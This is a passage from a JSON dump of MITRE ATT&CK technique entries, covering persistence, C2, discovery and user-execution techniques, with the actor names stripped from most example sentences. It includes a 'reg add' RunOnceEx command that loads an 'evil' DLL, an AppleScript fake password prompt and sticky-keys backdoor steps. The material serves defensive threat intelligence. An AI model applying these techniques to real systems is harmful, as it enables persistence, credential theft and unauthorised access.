      "has used an RSS feed on Livejournal to update a list of encrypted C2 server names.",
      "hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.",
      "has used a VBScript named \"ggldr\" that uses Google Apps Script, Sheets, and Forms services for C2."
    ],
    "id": "T1102",
    "name": "Web Service",
    "similar_words": [
      "Web Service"
    ]
  },
  "attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91": {
    "description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.",
    "example_uses": [
      "After initial compromise,  will download a second stage to establish a more permanent presence on the affected system.",
      "attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs \"louder\" interactions with the malware.",
      "uses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.",
      "An  downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81."
    ],
    "id": "T1104",
    "name": "Multi-Stage Channels",
    "similar_words": [
      "Multi-Stage Channels"
    ]
  },
  "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5": {
    "description": "An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.",
    "example_uses": [
      "has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.",
      "has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.",
      "has sent emails containing malicious attachments or links that require users to execute a file or macro to infect the victim machine.",
      "attempted to get users to launch malicious attachments delivered via spearphishing emails.",
      "lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.",
      "has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.",
      "embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.",
      "makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it.",
      "has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.",
      "has delivered malicious links and macro-enabled documents that required targets to click the \"enable content\" button to execute the payload on the system.",
      "has lured users to click links to malicious HTML applications delivered via spearphishing emails.",
      "has used various forms of spearphishing in attempts to get users to open links or attachments.",
      "attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.",
      "A Word document delivering  prompts the user to enable macro execution.",
      "has used spearphishing via a link to get users to download and run their malware.",
      "has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.",
      "attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.",
      "has sent spearphishing attachments attempting to get a user to open them.",
      "has used various forms of spearphishing attempting to get a user to open links or attachments.",
      "has sent spearphishing emails links and attachments attempting to get a user to click.",
      "has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.",
      "has leveraged multiple types of spearphishing in order to attempt to get a user to open links and attachments.",
      "has leveraged both Spearphishing Link and Spearphishing Attachment attempting to gain User Execution.",
      "attempted to get users to click on Microsoft Excel attachments containing malicious macro scripts.",
      "has attempted to get victims to open malicious files sent via email as part of spearphishing campaigns.",
      "has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.",
      "has attempted to get users to execute malware via social media and spearphishing emails."
    ],
    "id": "T1204",
    "name": "User Execution",
    "similar_words": [
      "User Execution"
    ]
  },
  "attack-pattern--8df54627-376c-487c-a09c-7d2b5620f56e": {
    "description": "Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)\n\nFor ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)\n\nAdversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.",
    "example_uses": [
      "drops and executes a malicious CPL file as its payload."
    ],
    "id": "T1196",
    "name": "Control Panel Items",
    "similar_words": [
      "Control Panel Items"
    ]
  },
  "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580": {
    "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network.\n\n### Windows\n\nAn example command that would obtain details on processes is \"tasklist\" using the [Tasklist](https://attack.mitre.org/software/S0057) utility.\n\n### Mac and Linux\n\nIn Mac and Linux, this is accomplished with the ps command.",
    "example_uses": [
      "lists the running processes.",
      "obtains a list of running processes.",
      "lists the running processes on the system.",
      "obtains a list of running processes through WMI querying and the ps command.",
      "lists the system’s processes.",
      "lists processes running on the system.",
      "lists running processes.",
      "gathers a list of processes using the tasklist command and then is sent back to the control server.",
      "Freenki malware lists running processes using the Microsoft Windows API.",
      "can obtain a list of running processes on the victim’s machine.",
      "checks the running processes on the victim’s machine.",
      "gets an output of running processes using the tasklist command.",
      "enumerates all running processes.",
      "identifies processes and collects the process ids.",
      "can obtain a list of running processes on the system.",
      "lists the current running processes on the system.",
      "lists the current processes running.",
      "uses the tasklist to view running processes on the victim’s machine.",
      "uses tasklist /v to check running processes.",
      "collects a list of running services with the command tasklist /v.",
      "performs the tasklist command to list running processes.",
      "can gather a list of processes.",
      "checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.",
      "can list all running processes.",
      "checks its parent process for indications that it is running in a sandbox setup.",
      "has the ability to list processes on the system.",
      "runs tasklist to obtain running processes.",
      "can get a list of the processes and running tasks on the system.",
      "can enumerate processes.",
      "creates a backdoor through which remote attackers can monitor processes.",
      "can gather a process list from the victim.",
      "creates a backdoor through which remote attackers can retrieve a list of running processes.",
      "Get-ProcessTokenPrivilege Privesc-PowerUp module can enumerate privileges for a given process.",
      "can list running processes.",
      "creates a backdoor through which remote attackers can retrieve lists of running processes.",
      "can enumerate processes.",
      "can list the running processes and get the process ID and parent process’s ID.",
      "has a tool that can list out currently running processes.",
      "has run tasklist on a victim's machine.",
      "malware can list running processes.",
      "has used  to get information on processes.",
      "may collect process information by running tasklist on a victim.",
      "An  loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.",
      "has gathered a process list by using .exe.",
      "collects information about running processes.",
      "has a command to upload information about all running processes to its C2 server.",
      "has a command to return a list of running processes.",
      "may collect information about running processes.",
      "can list running processes.",
      "can obtain information about running processes on the victim.",
      "obtains a list of running processes on the victim.",
      "has the capability to discover processes.",
      "collects current and parent process IDs.",
      "\"beacon\" payload can collect information on process details.",
      "has the capability to obtain a listing of running processes (including loaded modules).",
      "can send process listings over the C2 channel.",
      "can obtain a process list from the victim.",
      "collects information on running processes and environment variables from the victim.",
      "collects information about running processes from victims.",
      "collects its process identifier (PID) on the victim.",
      "can obtain information about process integrity levels.",
      "RAT is able to list processes.",
      "has the ability to search for a given process name in processes currently running in the system.",
      "contains a command to list processes.",
      "has the ability to enumerate processes.",
      "may gather a list of running processes by running tasklist /v.",
      "The OsInfo function in  collects a running process list.",
      "can be used to discover processes running on a system.",
      "The discovery modules used with  can collect information on process details.",
      "is capable of performing process listings.",
      "has a command to list the victim's processes.",
      "sets a WH_CBT Windows hook to collect information on process creation.",
      "contains the getProcessList function to run ps aux to get running processes.",
      "can list running processes.",
      "has a command to obtain a process listing.",
      "can use tasklist to collect a list of running tasks.",
      "looked for a specific process running on infected servers.",
      "malware gathers a list of running processes.",
      "After compromising a victim,  lists all running processes.",
      "Several  malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by  also gathers process times.",
      "actors obtained a list of active processes on the victim and sent them to C2 servers.",
      "surveys a system upon check-in to discover running processes using the tasklist /v command.",
      "uses the Microsoft  utility to list processes running on systems.",
      "performs process discovery using tasklist commands."
    ],
    "id": "T1057",
    "name": "Process Discovery",
    "similar_words": [
      "Process Discovery"
    ]
  },
  "attack-pattern--91ce1ede-107f-4d8b-bf4c-735e8789c94b": {
    "description": "When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task. Adversaries can mimic this functionality to prompt users for credentials with a normal-looking prompt. This type of prompt can be accomplished with AppleScript:\n\nset thePassword to the text returned of (display dialog \"AdobeUpdater needs permission to check for updates. Please authenticate.\" default answer \"\")\n (Citation: OSX Keydnap malware)\n\nAdversaries can prompt a user for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. (Citation: OSX Malware Exploits MacKeeper)",
    "example_uses": [
      "prompts the user for their credentials.",
      "presents an input prompt asking for the user's login and password.",
      "prompts the user for credentials.",
      "prompts users for their credentials.",
      "prompts the users for credentials."
    ],
    "id": "T1141",
    "name": "Input Prompt",
    "similar_words": [
      "Input Prompt"
    ]
  },
  "attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414": {
    "description": "Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an adversary gains access to these systems, then they may be able to execute code.\n\nAdversaries may gain access to and use third-party application deployment systems installed within an enterprise network. Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.",
    "example_uses": [
      "It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the  malware.",
      "actors used a victim's endpoint management platform, Altiris, for lateral movement."
    ],
    "id": "T1072",
    "name": "Third-party Software",
    "similar_words": [
      "Third-party Software"
    ]
  },
  "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d": {
    "description": "Data exfiltration is performed over the Command and Control channel. Data is encoded into the normal communications channel using the same protocol as command and control communications.",
    "example_uses": [
      "exfiltrates data over its C2 channel.",
      "sends collected files back over same C2 channel.",
      "can upload files from the victim's machine to its C2 server.",
      "performs data exfiltration over the control server channel using a custom protocol.",
      "can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.",
      "has a tool that exfiltrates data over the C2 channel.",
      "exfiltrates screenshot files to its C2 server.",
      "Adversaries can direct  to upload files to the C2 Server.",
      "exfiltrates data to its C2 server over the same protocol as C2 communications.",
      "exfiltrates data over the same channel used for C2.",
      "exfiltrates data to its C2 server over the same protocol as C2 communications.",
      "exfiltrates data to its C2 server over the same protocol as C2 communications.",
      "is capable of reading files over the C2 channel.",
      "A  file stealer transfers collected files to a hardcoded C2 server.",
      "After data is collected by  malware, it is exfiltrated over the existing C2 channel.",
      "malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers. Another  malware sample also performs exfiltration over the C2 channel.",
      "transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations."
    ],
    "id": "T1041",
    "name": "Exfiltration Over Command and Control Channel",
    "similar_words": [
      "Exfiltration Over Command and Control Channel"
    ]
  },
  "attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc": {
    "description": "Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nThe HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Visa and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
    "example_uses": [
      "version of  adds a registry key to HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.",
      "Several  backdoors achieved persistence by adding a Run key.",
      "A  tool can add the binary’s path to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to add persistence.",
      "A  Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally, a  custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.",
      "adds itself to the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\ for persistence.",
      "establishes persistence under the Registry key HKCU\\Software\\Run auto_update.",
      "creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.",
      "has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.",
      "An  HTTP malware variant establishes persistence by setting the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\.",
      "added the registry value ntdll to the Registry Run key to establish persistence.",
      "gains persistence by adding the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce.",
      "uses a batch file that configures the ComSysApp service to autostart in order to establish persistence.",
      "created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.",
      "Some  variants establish persistence by modifying the Registry key HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe.",
      "malware can create a .lnk file and add a Registry Run key to establish persistence.",
      "uses run keys for persistence on Windows",
      "stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.",
      "establishes persistence in the Startup folder.",
      "adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.",
      "is capable of writing to a Registry Run key to establish.",
      "modifies the %regrun% Registry to point itself to an autostart mechanism.",
      "adds itself to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence upon reboot.",
      "adds a sub-key under several Registry run keys.",
      "creates run key Registry entries pointing to a malicious executable dropped to disk.",
      "achieves persistence by adding a shortcut of itself to the startup path in the Registry.",
      "establishes persistence by creating the Registry key HKCU\\Software\\Microsoft\\Windows\\Run.",
      "has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\.",
      "has added Registry Run keys to establish persistence.",
      "creates a Registry start-up entry to establish persistence.",
      "adds itself to the startup folder or adds itself to the Registry key SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run for persistence.",
      "has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.",
      "creates run key Registry entries pointing to malicious DLLs dropped to disk.",
      "copies itself to disk and creates an associated run key Registry entry to establish.",
      "New-UserPersistenceOption Persistence argument can be used to establish via the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
      "can establish using a Registry run key.",
      "has used a batch script that adds a Registry Run key to establish malware persistence.",
      "establishes persistence by creating a shortcut in the Start Menu folder.",
      "adds a Registry Run key to establish persistence.",
      "uses PowerShell to add a Registry Run key in order to establish persistence.",
      "places scripts in the startup folder for persistence.",
      "can establish persistence by adding Registry Run keys.",
      "malware has used Registry Run keys to establish persistence.",
      "can establish persistence by creating a .lnk file in the Start menu.",
      "creates a shortcut file and saves it in a Startup folder to establish persistence.",
      "achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.",
      "adds a Registry Run key for ctfmon.exe to establish persistence.",
      "adds itself to a Registry Run key with the name guidVGA or guidVSA.",
      "has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.",
      "Most  samples maintain persistence by setting the Registry Run key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ in the HKLM or HKCU hive, with the Registry value and file name varying by sample.",
      "registers itself under a Registry Run key with the name \"USB Disk Security.\"",
      "may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}.",
      "has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.",
      "establishes persistence by adding a Registry Run key.",
      "One persistence mechanism used by  is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: <br>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ <br>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ <br>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run <br>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
      "achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.",
      "Variants of  have added Run Registry keys to establish persistence.",
      "can add a Run key entry in the Registry to establish persistence.",
      "If establishing persistence by installation as a new service fails, one variant of  establishes persistence for the created .exe file by setting the following Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe. Other variants have set the following Registry key for persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self].",
      "achieves persistence by creating a Registry entry in HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.",
      "The  3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.",
      "installs a registry Run key to establish persistence.",
      "has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the registry run key location: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe",
      "adds Registry Run keys to achieve persistence.",
      "creates a Registry Run key to establish persistence.",
      "has been known to establish persistence by adding programs to the Run Registry key.",
      "To establish persistence,  identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.",
      "malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.",
      "has established persistence by setting the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key value for wdm to the path of the executable. It has also used the Registry entry HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn “%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe” to establish persistence.",
      "achieves persistence by adding itself to the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
      "achieves persistence by making an entry in the Registry's Run key.",
      "achieves persistence by creating a shortcut in the current user's Startup folder.",
      "creates a Registry Run key to establish persistence.",
      "attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys.",
      "creates the following Registry entry: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia.",
      "achieves persistence by using various Registry Run keys.",
      "is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.",
      "establishes persistence through a Registry Run key.",
      "tries to add a Registry Run key under the name \"Windows Update\" to establish persistence.",
      "The \"SCOUT\" variant of  achieves persistence by adding itself to the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
      "installs itself under Registry Run key to establish persistence.",
      "achieves persistence by creating a shortcut in the Startup folder.",
      "establishes persistence via a Registry Run key.",
      "can create a shortcut in the Windows startup folder for persistence.",
      "can create a link to itself in the Startup folder to automatically start itself upon system restart.",
      "has established persistence by using the Registry option in PowerShell Empire to add a Run key.",
      "persists by creating a Registry entry in HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\.",
      "copies itself to the Startup folder to establish persistence.",
      "has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.",
      "has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.",
      "malware attempts to maintain persistence by saving itself in the Start menu folder or by adding a Registry Run key.",
      "A dropper used by  installs itself into the ASEP Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with a value named McUpdate.",
      "added Registry Run keys to establish persistence.",
      "has been known to establish persistence by adding programs to the Run Registry key."
    ],
    "id": "T1060",
    "name": "Registry Run Keys / Startup Folder",
    "similar_words": [
      "Registry Run Keys / Startup Folder"
    ]
  },
  "attack-pattern--970cdb5c-02fb-4c38-b17e-d6327cf3c810": {
    "description": "Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.",
    "example_uses": [
      "created several .LNK files on the victim's machine.",
      "manipulated .lnk files to gather user credentials in conjunction with .",
      "establishes persistence via a .lnk file in the victim’s startup path.",
      "malware can create a .lnk file and add a Registry Run key to establish persistence.",
      "adds a .lnk file to the Windows startup folder.",
      "attempts to add a shortcut file in the Startup folder to achieve persistence.",
      "establishes persistence by creating a shortcut in the Windows startup folder to run a script each time the user logs in.",
      "has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.",
      "A  malware sample adds persistence on the system by creating a shortcut in the user’s Startup folder.",
      "creates a shortcut file and saves it in a Startup folder to establish persistence.",
      "establishes persistence by creating a shortcut.",
      "can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.",
      "To establish persistence,  identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.",
      "may create the file %HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk, which points to the malicious msdtc.exe file already created in the %CommonFiles% directory.",
      "achieves persistence by creating a shortcut in the Startup folder.",
      "is capable of persisting via a .lnk file stored in the Startup directory.",
      "can create a shortcut in the Windows startup folder for persistence.",
      "achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.",
      "The  3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.",
      "achieves persistence by creating a shortcut in the current user's Startup folder."
    ],
    "id": "T1023",
    "name": "Shortcut Modification",
    "similar_words": [
      "Shortcut Modification"
    ]
  },
  "attack-pattern--99709758-2b96-48f2-a68a-ad7fbd828091": {
    "description": "Some adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.",
    "example_uses": [
      "\"beacon\" payload can receive C2 from one protocol and respond on another. This is typically a mixture of HTTP, HTTPS, and DNS traffic.",
      "can be configured to use multiple network protocols to avoid network-based detection.",
      "Some  malware uses multiple channels for C2, such as RomeoWhiskey-Two, which consists of a RAT channel that parses data in datagram form and a Proxy channel that forms virtual point-to-point sessions."
    ],
    "id": "T1026",
    "name": "Multiband Communication",
    "similar_words": [
      "Multiband Communication"
    ]
  },
  "attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69": {
    "description": "The  (Citation: Microsoft Component Object Model) (COM) is a system within Windows to enable interaction between software components through the operating system. (Citation: Microsoft Component Object Model) Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
    "example_uses": [
      "uses COM hijacking as a method of persistence.",
      "has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList {42aedc87-2188-41fd-b9a3-0c966feabec1} or Microsoft WBEM New Event Subsystem {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} depending on the system's CPU architecture.",
      "samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32.",
      "Some variants of  achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.",
      "has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).",
      "has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload."
    ],
    "id": "T1122",
    "name": "Component Object Model Hijacking",
    "similar_words": [
      "Component Object Model Hijacking"
    ]
  },
  "attack-pattern--9b99b83a-1aac-4e29-b975-b374950551a3": {
    "description": "Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are C:\\Windows\\System32\\sethc.exe, launched when the shift key is pressed five times and C:\\Windows\\System32\\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\\, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\\Windows\\System32\\utilman.exe) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nFor the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for the accessibility program (e.g., \"utilman.exe\"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)\n\n* On-Screen Keyboard: C:\\Windows\\System32\\osk.exe\n* Magnifier: C:\\Windows\\System32\\Magnify.exe\n* Narrator: C:\\Windows\\System32\\Narrator.exe\n* Display Switcher: C:\\Windows\\System32\\DisplaySwitch.exe\n* App Switcher: C:\\Windows\\System32\\AtBroker.exe",
    "example_uses": [
      "replaces the Sticky Keys binary C:\\Windows\\System32\\sethc.exe for persistence.",
      "used sticky-keys to obtain unauthenticated, privileged console access.",
      "has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.",
      "actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence."
    ],
    "id": "T1015",
    "name": "Accessibility Features",
    "similar_words": [
      "Accessibility Features"
    ]
  },
  "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36": {
